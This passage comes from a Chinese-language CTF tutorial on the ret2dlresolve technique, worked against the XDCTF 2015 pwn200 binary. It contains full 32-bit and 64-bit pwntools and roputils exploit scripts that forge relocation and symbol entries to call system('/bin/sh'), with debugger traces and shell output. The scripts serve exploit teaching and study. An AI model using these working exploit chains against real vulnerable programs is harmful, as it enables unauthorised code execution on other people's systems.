 0x8048000  0x8049000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
 0x8049000  0x804a000 r--p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
 0x804a000  0x804b000 rw-p     1000 1000   /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
0xf7ce8000 0xf7ebd000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc-2.27.so
0xf7ebd000 0xf7ebe000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
0xf7ebe000 0xf7ec0000 r--p     2000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
0xf7ec0000 0xf7ec1000 rw-p     1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so
0xf7ec1000 0xf7ec4000 rw-p     3000 0      
0xf7edf000 0xf7ee1000 rw-p     2000 0      
0xf7ee1000 0xf7ee4000 r--p     3000 0      [vvar]
0xf7ee4000 0xf7ee6000 r-xp     2000 0      [vdso]
0xf7ee6000 0xf7f0c000 r-xp    26000 0      /lib/i386-linux-gnu/ld-2.27.so
0xf7f0c000 0xf7f0d000 r--p     1000 25000  /lib/i386-linux-gnu/ld-2.27.so
0xf7f0d000 0xf7f0e000 rw-p     1000 26000  /lib/i386-linux-gnu/ld-2.27.so
0xffa4b000 0xffa6d000 rw-p    22000 0      [stack]
```

 而在动态解析符号地址的过程中，如果 version 为 NULL 的话，也会正常解析符号。

与此同，根据上面的调试信息，可以知道 l_versions 的前两个元素中的 hash 值都为 0，因此如果我们使得 ndx 为 0 或者 1 时，就可以满足要求，我们来在 080487A8 下方找一个合适的值。可以发现 0x080487C2 处的内容为0。

那自然的，我们就可以调用目标函数。

这里，我们可以通过调整 base_stage 来达到相应的目的。

- 首先 0x080487C2 与 0x080487A8 之间差了 0x080487C2-0x080487A8)/2 个 version 记录。
- 那么，这也就说明原先的符号表偏移少了对应的个数。
- 因此，我们只需要将 base_stage 增加 (0x080487C2-0x080487A8)/2*0x10，即可达到对应的目的。
```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size + (0x080487C2-0x080487A8)/2*0x10
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

rop = ROP('./main_partial_relro_32')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

# make a fake write symbol at base_stage + 32 + align
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf
                )  # since the size of Elf32_Symbol is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
fake_write_sym = flat([0x4c, 0, 0, 0x12])

# make fake write relocation at base_stage+24
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7 # calculate the r_info according to the index of write
fake_write_reloc = flat([write_got, r_info])

gnu_version_addr = elf.get_section_by_name('.gnu.version').header.sh_addr
print("ndx_addr: %s" % hex(gnu_version_addr+index_dynsym*2))

# construct rop chain
rop.raw(plt0)
rop.raw(index_offset)
rop.raw('bbbb') # fake ret addr of write
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw('a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
```

最终如下
```shell
❯ python stage4.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 27967
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
ndx_addr: 0x80487c2
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
```

##### stage 5

这一阶段，我们将在阶段 4 的基础上，进一步伪造 write 符号的 st_name 指向我们自己构造的字符串。
```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size + (0x080487C2-0x080487A8)/2*0x10
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())


rop = ROP('./main_partial_relro_32')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

# make a fake write symbol at base_stage + 32 + align
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)  # since the size of Elf32_Symbol is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
st_name = fake_sym_addr + 0x10 - dynstr         # plus 10 since the size of Elf32_Sym is 16.
fake_write_sym = flat([st_name, 0, 0, 0x12])

# make fake write relocation at base_stage+24
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7 # calculate the r_info according to the index of write
fake_write_reloc = flat([write_got, r_info])

# construct rop chain
rop.raw(plt0)
rop.raw(index_offset)
rop.raw('bbbb') # fake ret addr of write
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw('a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw('write\x00')  # there must be a \x00 to mark the end of string
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))
r.sendline(rop.chain())
r.interactive()
```

效果如下
```shell
❯ python stage5.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 27994
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
```

事实上，这里的 index_dynsym 又发生了变化，但似乎并不影响，因此我们也不用再想办法伪造数据了。

##### stage 6

这一阶段，我们只需要将原先的 write 字符串修改为 system 字符串，同时修改 write 的参数为 system 的参数即可获取 shell。这是因为 `_dl_runtime_resolve` 函数最终是依赖函数名来解析目标地址的。
```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size + (0x080487C2-0x080487A8)/2*0x10
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())


rop = ROP('./main_partial_relro_32')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

# make a fake write symbol at base_stage + 32 + align
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)  # since the size of Elf32_Symbol is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
st_name = fake_sym_addr + 0x10 - dynstr         # plus 10 since the size of Elf32_Sym is 16.
fake_write_sym = flat([st_name, 0, 0, 0x12])

# make fake write relocation at base_stage+24
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7 # calculate the r_info according to the index of write
fake_write_reloc = flat([write_got, r_info])

gnu_version_addr = elf.get_section_by_name('.gnu.version').header.sh_addr
print("ndx_addr: %s" % hex(gnu_version_addr+index_dynsym*2))

# construct ropchain
rop.raw(plt0)
rop.raw(index_offset)
rop.raw('bbbb') # fake ret addr of write
rop.raw(base_stage + 82)
rop.raw('bbbb')
rop.raw('bbbb')
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw('a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw('system\x00')  # there must be a \x00 to mark the end of string
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh + '\x00')
rop.raw('a' * (100 - len(rop.chain())))
print rop.dump()
print len(rop.chain())
r.sendline(rop.chain())
r.interactive()
```

需要注意的是，这里我把 /bin/sh 的偏移修改为了 base_stage+82，这是因为 pwntools 会对齐字符串。如下面的 ropchain 所示，0x40 处多了两个 a，比较奇怪。
```
0x0038:           'syst' 'system\x00'
0x003c:        'em\x00o'
0x0040:             'aa'
0x0042:           'aaaa' 'aaaaaaaaaaaaaa'
```

效果如下
```shell
❯ python stage6.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 28204
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
ndx_addr: 0x80487c2
0x0000:        0x8048370
0x0004:           0x25ec
0x0008:           'bbbb' 'bbbb'
0x000c:        0x804a94a
0x0010:           'bbbb' 'bbbb'
0x0014:           'bbbb' 'bbbb'
0x0018: '\x1c\xa0\x04\x08' '\x1c\xa0\x04\x08\x07u\x02\x00'
0x001c:  '\x07u\x02\x00'
0x0020:           'aaaa' 'aaaa'
0x0024:  '\xc0&\x00\x00' '\xc0&\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00'
0x0028: '\x00\x00\x00\x00'
0x002c: '\x00\x00\x00\x00'
0x0030: '\x12\x00\x00\x00'
0x0034:           'syst' 'system\x00'
0x0038:        'em\x00n'
0x003c:             'aa'
0x003e:           'aaaa' 'aaaaaaaaaaaaaaaaaa'
0x0042:           'aaaa'
0x0046:           'aaaa'
0x004a:           'aaaa'
0x004e:           'aaaa'
0x0052:           '/bin' '/bin/sh\x00'
0x0056:        '/sh\x00'
0x005a:           'aaaa' 'aaaaaaaaaa'
0x005e:           'aaaa'
0x0062:           'aaaa'
102
[*] Switching to interactive mode
/bin/sh: 1: aa: not found
$ ls
exp-pwntools.py        roptool.py    stage2.py    stage5.py
ld-linux.so.2           roputils.pyc  stage3.py    stage6.py
main_partial_relro_32  stage1.py     stage4.py
```

#### 基于工具伪造

根据上面的介绍，我们应该可以理解这个攻击了。

##### Roputil

下面我们直接使用 roputil 来进行攻击。代码如下
```python
from roputils import *
from pwn import process
from pwn import gdb
from pwn import context
r = process('./main')
context.log_level = 'debug'
r.recv()

rop = ROP('./main')
offset = 112
bss_base = rop.section('.bss')
buf = rop.fill(offset)

buf += rop.call('read', 0, bss_base, 100)
## used to call dl_runtimeresolve()
buf += rop.dl_resolve_call(bss_base + 20, bss_base)
r.send(buf)

buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
## used to make faking data, such relocation, Symbol, Str
buf += rop.dl_resolve_data(bss_base + 20, 'system')
buf += rop.fill(100, buf)
r.send(buf)
r.interactive()
```

关于 dl_resolve_call 与 dl_resolve_data 的具体细节请参考 roputils.py 的源码，比较容易理解。需要注意的是，dl_resolve 执行完之后也是需要有对应的返回地址的。

效果如下
```shell
❯ python roptool.py
[+] Starting local process './main_partial_relro_32': pid 24673
[DEBUG] Received 0x17 bytes:
    'Welcome to XDCTF2015~!\n'
[DEBUG] Sent 0x94 bytes:
    00000000  42 6a 63 57  32 34 75 7a  30 64 6d 71  45 54 50 31  │BjcW│24uz│0dmq│ETP1│
    00000010  42 63 4b 61  4c 76 5a 35  38 77 79 6d  4c 62 34 74  │BcKa│LvZ5│8wym│Lb4t│
    00000020  56 47 4c 57  62 67 55 4b  65 57 4c 64  34 62 6f 47  │VGLW│bgUK│eWLd│4boG│
    00000030  43 47 59 65  4f 41 73 4c  61 35 79 4f  56 47 51 71  │CGYe│OAsL│a5yO│VGQq│
    00000040  59 53 47 69  6e 68 62 35  6f 33 4a 6e  31 77 66 68  │YSGi│nhb5│o3Jn│1wfh│
    00000050  45 6f 38 6b  61 46 46 38  4f 67 6c 62  61 41 58 47  │Eo8k│aFF8│Oglb│aAXG│
    00000060  66 7a 4b 30  63 6d 43 43  74 73 4d 7a  52 66 58 63  │fzK0│cmCC│tsMz│RfXc│
    00000070  a0 83 04 08  19 86 04 08  00 00 00 00  40 a0 04 08  │····│····│····│@···│
    00000080  64 00 00 00  80 83 04 08  28 1d 00 00  79 83 04 08  │d···│····│(···│y···│
    00000090  40 a0 04 08                                         │@···│
    00000094
[DEBUG] Sent 0x64 bytes:
    00000000  2f 62 69 6e  2f 73 68 00  35 45 4e 50  6e 51 51 4b  │/bin│/sh·│5ENP│nQQK│
    00000010  74 30 57 47  62 55 49 54  54 a0 04 08  07 e9 01 00  │t0WG│bUIT│T···│····│
    00000020  6c 30 39 79  68 4c 58 4b  00 1e 00 00  00 00 00 00  │l09y│hLXK│····│····│
    00000030  00 00 00 00  12 00 00 00  73 79 73 74  65 6d 00 7a  │····│····│syst│em·z│
    00000040  32 45 74 78  75 35 59 6a  55 6b 54 74  63 46 70 71  │2Etx│u5Yj│UkTt│cFpq│
    00000050  32 42 6f 4c  43 53 49 33  75 47 59 53  7a 76 63 6b  │2BoL│CSI3│uGYS│zvck│
    00000060  44 43 4d 41                                         │DCMA│
    00000064
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0x9f bytes:
    'exp-pwntools.py        roptool.py    stage2.py\tstage5.py\n'
    'ld-linux.so.2\t       roputils.pyc  stage3.py\tstage6.py\n'
    'main_partial_relro_32  stage1.py     stage4.py\n'
exp-pwntools.py        roptool.py    stage2.py    stage5.py
ld-linux.so.2           roputils.pyc  stage3.py    stage6.py
main_partial_relro_32  stage1.py     stage4.py
```

##### pwntools

这里我们使用 pwntools 的工具进行攻击。
```python
from pwn import *
context.binary = elf = ELF("./main_partial_relro_32")
rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh"])
# pwntools will help us choose a proper addr
# https://github.com/Gallopsled/pwntools/blob/5db149adc2/pwnlib/rop/ret2dlresolve.py#L237
rop.read(0,dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
io = process("./main_partial_relro_32")
io.recvuntil("Welcome to XDCTF2015~!\n")
payload = flat({112:raw_rop,256:dlresolve.payload})
io.sendline(payload)
io.interactive()
```

结果如下
```shell
❯ python exp-pwntools.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
[+] Starting local process './main_partial_relro_32': pid 24688
[*] Switching to interactive mode
$ ls
exp-pwntools.py        roptool.py    stage2.py    stage5.py
ld-linux.so.2           roputils.pyc  stage3.py    stage6.py
main_partial_relro_32  stage1.py     stage4.py
```

### Full RELRO

在开启 FULL RELRO 保护的情况下，程序中导入的函数地址会在程序开始执行之前被解析完毕，因此 got 表中 link_map 以及 dl_runtime_resolve 函数地址在程序执行的过程中不会被用到。故而，GOT 表中的这两个地址均为 0。此时，直接使用上面的技巧是不行的。

那有没有什么办法可以绕过这样的防护呢？请读者自己思考。

## 64 位例子

### NO RELRO

在这种情况下，类似于 32 位的情况直接构造即可。由于可以溢出的缓冲区太少，所以我们可以考虑进行栈迁移后，然后进行漏洞利用。

1. 在 bss 段伪造栈。栈中的数据为
    1. 修改 .dynamic 节中字符串表的地址为伪造的地址
    2. 在伪造的地址处构造好字符串表，将 read 字符串替换为 system 字符串。
    3. 在特定的位置读取 /bin/sh 字符串。
    4. 调用 read 函数的 plt 的第二条指令，触发 `_dl_runtime_resolve` 进行函数解析，从而触发执行 system 函数。
2. 栈迁移到 bss 段。

由于程序中没有直接设置 rdx 的 gadget，所以我们这里就选择了万能 gadget。这会使得我们的 ROP 链变得更长
```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_no_relro_64")
rop = ROP("./main_no_relro_64")
elf = ELF("./main_no_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400750
csu_end_addr = 0x40076A
leave_ret  =0x40063c
poprbp_ret = 0x400588
def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    return payload

io.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set rsp = new_stack
stack_size = 0x200 # new stack size is 0x200
new_stack = bss_addr+0x100

offset = 112+8
rop.raw(offset*'a')
payload1 = csu(0, 1 ,elf.got['read'],0,new_stack,stack_size)
rop.raw(payload1)
rop.raw(0x400607)
assert(len(rop.chain())<=256)
rop.raw("a"*(256-len(rop.chain())))
# gdb.attach(io)
io.send(rop.chain())

# construct fake stack
rop = ROP("./main_no_relro_64")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600988+8,8))  # modify .dynstr pointer in .dynamic section to a specific location
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace("read","system")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30,len(dynstr)))  # construct a fake dynstr section
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30+len(dynstr),len("/bin/sh\x00")))  # read /bin/sh\x00
rop.raw(0x0000000000400773) # pop rdi; ret
rop.raw(0x600B30+len(dynstr))
rop.raw(0x400516) # the second instruction of read@plt 
rop.raw(0xdeadbeef)
rop.raw('a'*(stack_size-len(rop.chain())))
io.send(rop.chain())

# reuse the vuln to stack pivot
rop = ROP("./main_no_relro_64")
rop.raw(offset*'a')
rop.migrate(new_stack)
assert(len(rop.chain())<=256)
io.send(rop.chain()+'a'*(256-len(rop.chain())))

# now, we are on the new stack
io.send(p64(0x600B30)) # fake dynstr location
io.send(dynstr) # fake dynstr
io.send("/bin/sh\x00")

io.interactive()
```

直接运行，发现不行，经过调试发现程序在 0x7f2512db3e69 处崩了。
```assembly
 RAX  0x600998 (_DYNAMIC+144) ◂— 0x6
 RBX  0x600d98 ◂— 0x6161616161616161 ('aaaaaaaa')
 RCX  0x7f2512ac3191 (read+17) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x9
 RDI  0x600b30 (stdout@@GLIBC_2.2.5) ◂— 0x0
 RSI  0x3
 R8   0x50
 R9   0x7f2512faf4c0 ◂— 0x7f2512faf4c0
 R10  0x7f2512fcd170 ◂— 0x0
 R11  0x246
 R12  0x6161616161616161 ('aaaaaaaa')
 R13  0x6161616161616161 ('aaaaaaaa')
 R14  0x6161616161616161 ('aaaaaaaa')
 R15  0x6161616161616161 ('aaaaaaaa')
 RBP  0x6161616161616161 ('aaaaaaaa')
 RSP  0x6009e0 (_DYNAMIC+216) —▸ 0x600ae8 (_GLOBAL_OFFSET_TABLE_) ◂— 0x0
 RIP  0x7f2512db3e69 (_dl_fixup+41) ◂— mov    rcx, qword ptr [r8 + 8]
──────[ DISASM ]────────
   0x7f2512db3e52 <_dl_fixup+18>    mov    rdi, qword ptr [rax + 8]
   0x7f2512db3e56 <_dl_fixup+22>    mov    rax, qword ptr [r10 + 0xf8]
   0x7f2512db3e5d <_dl_fixup+29>    mov    rax, qword ptr [rax + 8]
   0x7f2512db3e61 <_dl_fixup+33>    lea    r8, [rax + rdx*8]
   0x7f2512db3e65 <_dl_fixup+37>    mov    rax, qword ptr [r10 + 0x70]
 ► 0x7f2512db3e69 <_dl_fixup+41>    mov    rcx, qword ptr [r8 + 8] <0x7f2512ac3191>
```

经过逐步调试发现，在 `_dl_runtime_resolve` 会在栈中保存大量的数据
```assembly
.text:00000000000177A0 ; __unwind {
.text:00000000000177A0                 push    rbx
.text:00000000000177A1                 mov     rbx, rsp
.text:00000000000177A4                 and     rsp, 0FFFFFFFFFFFFFFC0h
.text:00000000000177A8                 sub     rsp, cs:qword_227808
.text:00000000000177AF                 mov     [rsp+8+var_8], rax
.text:00000000000177B3                 mov     [rsp+8], rcx
.text:00000000000177B8                 mov     [rsp+8+arg_0], rdx
.text:00000000000177BD                 mov     [rsp+8+arg_8], rsi
.text:00000000000177C2                 mov     [rsp+8+arg_10], rdi
.text:00000000000177C7                 mov     [rsp+8+arg_18], r8
.text:00000000000177CC                 mov     [rsp+8+arg_20], r9
.text:00000000000177D1                 mov     eax, 0EEh
.text:00000000000177D6                 xor     edx, edx
.text:00000000000177D8                 mov     [rsp+8+arg_240], rdx
.text:00000000000177E0                 mov     [rsp+8+arg_248], rdx
.text:00000000000177E8                 mov     [rsp+8+arg_250], rdx
.text:00000000000177F0                 mov     [rsp+8+arg_258], rdx
.text:00000000000177F8                 mov     [rsp+8+arg_260], rdx
.text:0000000000017800                 mov     [rsp+8+arg_268], rdx
.text:0000000000017808                 xsavec  [rsp+8+arg_30]
.text:000000000001780D                 mov     rsi, [rbx+10h]
.text:0000000000017811                 mov     rdi, [rbx+8]
.text:0000000000017815                 call    sub_FE40
```

其中 qword_227808 处的值为0x0000000000000380。
```assembly
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
          0x600000           0x601000 rw-p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
    0x7f25129b3000     0x7f2512b9a000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512b9a000     0x7f2512d9a000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9a000     0x7f2512d9e000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9e000     0x7f2512da0000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512da0000     0x7f2512da4000 rw-p     4000 0      
    0x7f2512da4000     0x7f2512dcb000 r-xp    27000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fae000     0x7f2512fb0000 rw-p     2000 0      
    0x7f2512fcb000     0x7f2512fcc000 r--p     1000 27000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcc000     0x7f2512fcd000 rw-p     1000 28000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcd000     0x7f2512fce000 rw-p     1000 0      
    0x7fff26cdd000     0x7fff26cff000 rw-p    22000 0      [stack]
    0x7fff26d19000     0x7fff26d1c000 r--p     3000 0      [vvar]
    0x7fff26d1c000     0x7fff26d1e000 r-xp     2000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
pwndbg> x/gx 0x7f2512da4000+0x227808
0x7f2512fcb808 <_rtld_global_ro+168>:	0x0000000000000380
```

当执行完下面的指令后
```assembly
 ► 0x7f2512dbb7a8 <_dl_runtime_resolve_xsavec+8>     sub    rsp, qword ptr [rip + 0x210059] <0x7f2512fcb808>
```

栈地址到了 0x600a00（我们是将栈迁移到了 bss_addr+0x100，即 0x600C30），即到了 .dynamic 节中，后续在栈中保存数据时会破坏 .dynamic 节中的内容，最后导致了 dl_fixup 崩溃。
```
   0x7f2512dbb7a0 <_dl_runtime_resolve_xsavec>       push   rbx
   0x7f2512dbb7a1 <_dl_runtime_resolve_xsavec+1>     mov    rbx, rsp
   0x7f2512dbb7a4 <_dl_runtime_resolve_xsavec+4>     and    rsp, 0xffffffffffffffc0
   0x7f2512dbb7a8 <_dl_runtime_resolve_xsavec+8>     sub    rsp, qword ptr [rip + 0x210059] <0x7f2512fcb808>
 ► 0x7f2512dbb7af <_dl_runtime_resolve_xsavec+15>    mov    qword ptr [rsp], rax <0x600a00>
   0x7f2512dbb7b3 <_dl_runtime_resolve_xsavec+19>    mov    qword ptr [rsp + 8], rcx
   0x7f2512dbb7b8 <_dl_runtime_resolve_xsavec+24>    mov    qword ptr [rsp + 0x10], rdx
   0x7f2512dbb7bd <_dl_runtime_resolve_xsavec+29>    mov    qword ptr [rsp + 0x18], rsi
   0x7f2512dbb7c2 <_dl_runtime_resolve_xsavec+34>    mov    qword ptr [rsp + 0x20], rdi
   0x7f2512dbb7c7 <_dl_runtime_resolve_xsavec+39>    mov    qword ptr [rsp + 0x28], r8
─────────────────────[ STACK ]─────────────────
00:0000│ rsp  0x600a00 (_DYNAMIC+248) ◂— 0x7
01:0008│      0x600a08 (_DYNAMIC+256) ◂— 0x17
02:0010│      0x600a10 (_DYNAMIC+264) —▸ 0x400450 —▸ 0x600b00 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x7f2512ac3250 (write) ◂— lea    rax, [rip + 0x2e06a1]
03:0018│      0x600a18 (_DYNAMIC+272) ◂— 0x7
04:0020│      0x600a20 (_DYNAMIC+280) —▸ 0x4003f0 —▸ 0x600ad8 —▸ 0x7f25129d4ab0 (__libc_start_main) ◂— push   r13
05:0028│      0x600a28 (_DYNAMIC+288) ◂— 0x8
06:0030│      0x600a30 (_DYNAMIC+296) ◂— 0x60 /* '`' */
07:0038│      0x600a38 (_DYNAMIC+304) ◂— 9 /* '\t' */
```

或许我们可以考虑把栈再迁移的高一些，但是，程序中与 bss 相关的映射只有 0x600000-0x601000，即一页。与此同时

- bss 段的起始地址为 0x600B30
- 伪造的栈的数据一共有 392 （0x188）

所以直接栈迁移到 bss节很容易出现问题。
```assembly
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
          0x600000           0x601000 rw-p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
    0x7f25129b3000     0x7f2512b9a000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512b9a000     0x7f2512d9a000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9a000     0x7f2512d9e000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9e000     0x7f2512da0000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512da0000     0x7f2512da4000 rw-p     4000 0      
    0x7f2512da4000     0x7f2512dcb000 r-xp    27000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fae000     0x7f2512fb0000 rw-p     2000 0      
    0x7f2512fcb000     0x7f2512fcc000 r--p     1000 27000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcc000     0x7f2512fcd000 rw-p     1000 28000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcd000     0x7f2512fce000 rw-p     1000 0      
    0x7fff26cdd000     0x7fff26cff000 rw-p    22000 0      [stack]
    0x7fff26d19000     0x7fff26d1c000 r--p     3000 0      [vvar]
    0x7fff26d1c000     0x7fff26d1e000 r-xp     2000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
```

但经过精细的调节，我们还是避免破坏 .dynamic 节的内容

- 修改迁移后的栈的地址为 bss_addr+0x200，即 0x600d30
- 修改迁移后的栈的大小为 0x188
```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_no_relro_64")
rop = ROP("./main_no_relro_64")
elf = ELF("./main_no_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400750
csu_end_addr = 0x40076A
leave_ret  =0x40063c
